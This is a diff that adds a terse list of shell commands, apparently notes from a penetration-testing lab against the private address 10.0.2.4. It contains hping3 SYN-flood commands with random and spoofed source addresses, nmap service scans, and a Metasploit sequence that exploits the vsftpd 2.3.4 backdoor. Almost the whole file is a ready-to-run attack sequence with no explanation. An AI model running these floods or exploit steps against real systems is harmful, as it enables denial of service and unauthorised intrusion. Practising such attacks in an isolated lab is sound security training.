@@ -1,0 +1,18 @@
+sudo apt-get install hping3
+hping3 -S 10.0.2.4 -p 80 -c 1
+hping3 --traceroute -V -1 10.0.2.4
+hping3 --rand-source -c 15000 -d 120 -w 64 -S -p 80 --flood 10.0.2.4
+hping3 -a 10.0.2.6 -c 15000 -d 120 -w 64 -S -p 80 --flood 10.0.2.4
+
+sudo apt-get install nmap
+nmap 10.0.2.4 (find)
+nmap -sC 10.0.2.4 -p 80 (anon ftp)
+nmap -sV 10.0.2.4 (open)
+searchsploit vsftpd 2.3.4
+msfconsole (new tab)
+msfconsole>> search vsftpd
+msfconsole>> use exploit/unix/ftp/vsftpd_234_backdoor
+---------->> show info
+---------->> show options
+---------->> set RHOSTS 10.0.2.4
+---------->> exploit
